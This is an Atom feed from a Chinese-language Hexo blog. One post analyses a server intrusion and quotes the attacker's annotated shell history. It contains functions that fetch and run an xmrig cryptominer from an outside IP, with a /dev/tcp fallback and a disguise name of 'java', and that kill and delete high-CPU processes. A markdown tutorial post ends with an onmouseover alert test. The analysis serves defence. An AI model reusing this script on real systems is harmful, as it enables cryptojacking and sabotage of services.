<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>rouxianer&#39;s share</title>
  
  <subtitle>交流，分享</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-01-03T06:30:43.896Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>lucciolash</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一次攻击分析</title>
    <link href="http://yoursite.com/2018/01/03/webs/exp_of_em_respon/"/>
    <id>http://yoursite.com/2018/01/03/webs/exp_of_em_respon/</id>
    <published>2018-01-03T03:31:15.000Z</published>
    <updated>2018-01-03T06:30:43.896Z</updated>
    
    <content type="html"><![CDATA[<p>##起因<br>昨天下班儿回家的路上，同事突然通过微信发了一个<strong>新建 Microsoft office word 2007 文档.docx</strong>过来。怀着下班懈怠的想法我并没有打开这个文档:）<br><del>而且他连名字都不改！懒惰！</del><br>稍后上了地铁，得知是一个业务系统被攻击了，业务在不断重启（当时说的是服务器，后来说是软件服务），他发给我的是一个现场的日志。后来听大佬说是可能是误kill了关键服务，所以导致服务重启；</p><p>下面先看一下history里的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  916  sPid=$$  //获得当前程序（shell）的pid</span><br><span class="line">  917  mPid=&apos;&apos;  //估计是脚本pid后面会赋值</span><br><span class="line">  918  mName=&apos;java&apos;  //伪装名称为java</span><br><span class="line">  919  checkCmd() &#123;</span><br><span class="line">           command -v $1 &gt;/dev/null 2&gt;&amp;1;</span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">```   </span><br><span class="line">关于这条语句，可以查看这篇[文章](http://blog.csdn.net/ggxiaobai/article/details/53507530)  </span><br><span class="line">看完是不是大概懂了这个bash指令的意思，  </span><br><span class="line">好的这条指令的意思是查看$1指令是否存在[拖走],$1是传参的第1个参数值（指令本身是第0个）</span><br></pre></td></tr></table></figure><p>  920  downloader () {<br>       if checkCmd wget; then//查看wget是否存在<br>           wget $1 -O $2 ;<br>       elif checkCmd curl; then//查看curl是否存在<br>           curl $1 -o $2;<br>       elif checkCmd python; then//查看是否装了python<br>           if [ “<code>python -c &quot;import sys; print(sys.version_info[0])&quot;</code>“ = “3” ]; then<br>           //判断是不是python3<br>               python -c “from urllib.request import urlopen;<br>               u = urlopen(‘“$1”‘); localFile = open(‘“$2”‘, ‘wb’);<br>               localFile.write(u.read()); localFile.close()”;<br>           else<br>           //python2的情况<br>               python -c “from urllib import urlopen;<br>              u = urlopen(‘“$1”‘);<br>              localFile = open(‘“$2”‘, ‘wb’);<br>              localFile.write(u.read());<br>              localFile.close()”;<br>           fi;<br>       else<br>           cat &lt; /dev/tcp/165.227.215.25/5555 &gt; $2;<br>           //把/dev/tcp/165.227.215.25/5555的内容定向输入到$2<br>       fi;<br>       chmod +x $2;<br>       }<br>  921  killer() {<br>           for tmpVar in <code>ps -aeo pid,%cpu,command | sed 1d | sort -k 2 | tail -n 10 | awk &#39;{print $1}&#39;</code>;<br>           //查看进程里pid,%cpu,command三列，删除第一列，按照第二列排序，取最后10个结果，取第一列的值<br>           //查看进程中cpu占用率最高的10个进程<br>           do<br>               if [ $tmpVar = $sPid ]; then<br>                   continue;<br>               //如果pid是shell的pid<br>               fi;<br>               if [ $tmpVar = $mPid ]; then<br>               //如果pid是该脚本的pid<br>                   continue；<br>               fi;<br>               if [ <code>ps -o %cpu $tmpVar | sed 1d | sed &#39;s/\..*//g&#39;</code> -ge 60 ]; then<br>                   if [ <code>ps $tmpVar | sed 1d | awk &#39;{print $5}&#39; | grep java</code> ]; then<br>                       continue;<br>                   fi;<br>                   if [ <code>ps $tmpVar | sed 1d | awk &#39;{print $5}&#39; | grep sh</code> ]; then<br>                       continue;<br>                   fi;<br>                   if [ <code>ps $tmpVar | sed 1d | awk &#39;{print $5}&#39; | grep bash</code> ]; then<br>                       continue;<br>                   fi;<br>                   kill -9 $tmpVar;<br>                   rm -f <code>ls -l /proc/$tmpVar/exe 2&gt;&amp;1 | sed &#39;s/.*-&gt; //g&#39;</code>;<br>                   fi;<br>               done;<br>        }<br>  922  runer() {<br>           if [ -z “$mPid” ]; then<br>               if [ ! -f $mName ]; then<br>                   downloader <a href="http://165.227.215.25/xmrig-y" target="_blank" rel="noopener">http://165.227.215.25/xmrig-y</a> $mName;<br>               fi;<br>               chmod +x ./$mName;<br>               ./$mName;<br>           fi;<br>           mPid=<code>ps -eo pid,command | grep $mName | head -n 1 | awk &#39;{print $1}&#39;</code>;<br>       }<br>  923  pkill python; pkill $mName<br>  924  downloader <a href="http://165.227.215.25/xmrig-y" target="_blank" rel="noopener">http://165.227.215.25/xmrig-y</a> $mName<br>  925  ps -ef|grep java</p><p>```  </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;##起因&lt;br&gt;昨天下班儿回家的路上，同事突然通过微信发了一个&lt;strong&gt;新建 Microsoft office word 2007 文档.docx&lt;/strong&gt;过来。怀着下班懈怠的想法我并没有打开这个文档:）&lt;br&gt;&lt;del&gt;而且他连名字都不改！懒惰！&lt;/del&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>markdown</title>
    <link href="http://yoursite.com/2017/12/30/markdown/"/>
    <id>http://yoursite.com/2017/12/30/markdown/</id>
    <published>2017-12-30T01:04:29.000Z</published>
    <updated>2018-01-02T08:17:47.440Z</updated>
    
    <content type="html"><![CDATA[<h1 id="markdown笔记"><a href="#markdown笔记" class="headerlink" title="markdown笔记"></a>markdown笔记</h1><p>Just for test</p><p>##常用语法</p><p>###标题<br>在文本前输入#用于声明标题，随数量增加级别递减；</p><p>###粗体<br>在内容两侧分别加<strong>2个星号</strong>，**文本内容**；<strong>示例</strong></p><p>###斜体<br>在内容两侧分别加<strong>1个星号</strong>，*文本内容*；<em>示例</em></p><p>###删除线<br>在内容两侧分别加<strong>2个波浪线</strong>，~~文本内容~~;<del>示例</del></p><p>###分割线<br>使用<strong>3个星号</strong>或者<strong>3个小短线</strong>，使用3个小短线会强制把上一行内容设置为2级标题;</p><h2 id="3个星号"><a href="#3个星号" class="headerlink" title="3个星号"></a><code>3个星号</code></h2><p><code>3个星号</code></p><hr><p>###外链<br>使用<code>**\[描述](链接地址)**</code>格式添加外链；<br>示例：<a href="about:blank" target="_blank" rel="noopener">空白页</a></p><p>###单行代码<br>在内容两侧分别加<strong>2个`(一称小句号)</strong>，`文本内容`;<code>示例</code></p><p>###多行代码<br>在内容两侧分别加<strong>3个`</strong>，```文本内容```;<br>(需要在文本后多换一行)  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我有行号  </span><br><span class="line">我有行号  </span><br><span class="line">我有行号</span><br></pre></td></tr></table></figure><p>或者换新行，然后在段落头输入<strong><code>Tab</code></strong>，或<strong><code>4个空格</code></strong>  </p><pre><code>我没有行号我没有行号我没有行号</code></pre><p>###引入内容<br>在内容前添加<strong>></strong>表示引入内容；</p><blockquote><p>示例  </p></blockquote><p>###插入图片<br>使用<code>**\![描述](链接地址)**</code>插入图片；<br><img src="/assets/img/end.jpeg" alt="没有"><br><img src="/assets/img/end.jpeg" onmouseover="alert('nothing else');alert('thanks')"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;markdown笔记&quot;&gt;&lt;a href=&quot;#markdown笔记&quot; class=&quot;headerlink&quot; title=&quot;markdown笔记&quot;&gt;&lt;/a&gt;markdown笔记&lt;/h1&gt;&lt;p&gt;Just for test&lt;/p&gt;
&lt;p&gt;##常用语法&lt;/p&gt;
&lt;p&gt;###
      
    
    </summary>
    
    
  </entry>
  
</feed>
